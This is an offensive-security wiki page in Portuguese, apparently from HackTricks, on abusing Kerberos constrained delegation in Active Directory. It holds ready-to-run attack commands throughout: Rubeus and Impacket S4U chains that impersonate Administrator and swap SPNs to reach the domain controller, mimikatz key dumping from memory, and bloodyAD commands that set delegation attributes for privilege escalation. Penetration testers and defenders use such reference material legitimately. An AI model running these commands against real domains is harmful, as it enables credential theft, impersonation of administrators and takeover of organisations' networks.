# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Usando isso, um Domain admin pode **permitir** que um computador **se passe por um usuário ou computador** contra qualquer **serviço** de uma máquina.

- **Service for User to self (_S4U2self_):** Qualquer **conta de serviço que possua um SPN** geralmente pode obter um TGS para si mesma em nome de um usuário arbitrário. Se a conta também tiver [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) em _userAccountControl_, esse TGS será **forwardable**, que é o que torna a protocol transition diretamente útil para a **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** Uma **conta de serviço** pode obter um TGS em nome de um usuário para os SPNs listados em **msDS-AllowedToDelegateTo**. O evidence ticket usado no S4U2Proxy deve ser um ticket **forwardable** para o serviço que realiza a delegação: um ticket real de cliente para serviço capturado da vítima ou um gerado com **S4U2Self + T2A4D**.

**Nota**: Se um usuário estiver marcado como ‘_Account is sensitive and cannot be delegated_’ no AD, ou for membro de **Protected Users**, geralmente você **não poderá se passar por ele** por meio de constrained delegation. Em domínios modernos, prefira material **AES** em vez de suposições baseadas somente em RC4 ao atingir contas habilitadas para delegação.

Isso significa que, se você **comprometer o hash do serviço**, poderá **se passar por usuários** e obter **acesso** em nome deles a qualquer **serviço** nas máquinas indicadas (possível **privesc**).

Além disso, você **não terá acesso apenas ao serviço que o usuário pode representar, mas também a qualquer serviço**, porque o SPN (o nome do serviço solicitado) não é verificado (no ticket, essa parte não é criptografada/assinada). Portanto, se você tiver acesso ao **serviço CIFS**, também poderá ter acesso ao **serviço HOST** usando, por exemplo, a flag `/altservice` no Rubeus. A mesma fraqueza de troca de SPN é explorada pelo **Impacket getST -altservice** e por outras ferramentas.

Além disso, o **acesso ao serviço LDAP no DC** é o necessário para explorar um **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Nota do operador:** não confie apenas em **ADUC** ou nas capturas de tela do BloodHound para revisar **gMSA/sMSA**. Essas contas geralmente ocultam a guia Delegation usual, portanto enumere diretamente os atributos brutos **`userAccountControl`** e **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Se a conta comprometida tiver **T2A4D**, normalmente você poderá concluir toda a cadeia **`S4U2Self -> S4U2Proxy`** usando apenas a service key/TGT.<sup>[[2]](#references)</sup>

Se ela tiver apenas **`msDS-AllowedToDelegateTo`** (o modo clássico **"Use Kerberos only"**), a delegation ainda poderá ser abusada, mas o evidence ticket para S4U2Proxy deverá ser um **real forwardable user-to-service ticket** para o serviço delegating. Na prática, isso significa roubar ou capturar um victim TGS do **LSASS/ccache** e fornecê-lo ao segundo estágio (`/tgs:` no Rubeus). Um ticket S4U2Self **non-forwardable** não é suficiente para classic constrained delegation; se esse for seu único evidence ticket, verifique [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Notas sobre constrained delegation entre domínios (2025+)

Desde o **Windows Server 2012/2012 R2**, o KDC oferece suporte a **constrained delegation entre domínios/forests** por meio de extensões S4U2Proxy. Builds modernos (Windows Server 2016–2025) mantêm esse comportamento e adicionam dois PAC SIDs para sinalizar protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) quando o usuário foi autenticado normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) quando um serviço afirmou a identidade por meio de protocol transition.

Espere encontrar `SERVICE_ASSERTED_IDENTITY` dentro do PAC quando protocol transition for usado entre domínios, confirmando que a etapa S4U2Proxy foi concluída com êxito.<sup>[[1]](#references)</sup>

### Ferramentas Impacket / Linux (altservice e full S4U)

O Impacket recente (0.11.x+) expõe a mesma cadeia S4U e a troca de SPN que o Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Se você preferir forjar o user ST primeiro (por exemplo, tendo apenas o hash offline), combine **ticketer.py** com **getST.py** para S4U2Proxy. **tgssub.py** também é útil quando você já tem um ccache funcional e só precisa trocar a service class para o mesmo host. Consulte a issue #1713 aberta do Impacket para conhecer os quirks atuais (KRB_AP_ERR_MODIFIED quando o ST forjado não corresponde à chave do SPN).<sup>[[2]](#references)</sup>

### Automatizando a configuração de delegation com creds de baixo privilégio

Se você já tiver **GenericAll/WriteDACL** sobre uma conta de computador ou de serviço, poderá enviar remotamente os atributos necessários sem usar RSAT, com o **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Isso permite criar um caminho de constrained delegation para privesc sem privilégios de DA assim que você puder gravar esses atributos.

- Step 1: **Obter o TGT do serviço permitido**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Existem **outras formas de obter um ticket TGT** ou o **RC4** ou **AES256** sem ser SYSTEM no computador, como o Printer Bug e unconstrain delegation, NTLM relaying e o abuso do Active Directory Certificate Service
>
> **Apenas tendo esse ticket TGT (ou hash), você pode realizar esse ataque sem comprometer o computador inteiro.**

- Step2: **Obter o TGS para o serviço personificando o usuário**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Mais informações em ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) e [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Visão geral do Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abusando de Delegation com Impacket (Parte 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity matou o domínio: uma visão geral ofensiva do Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
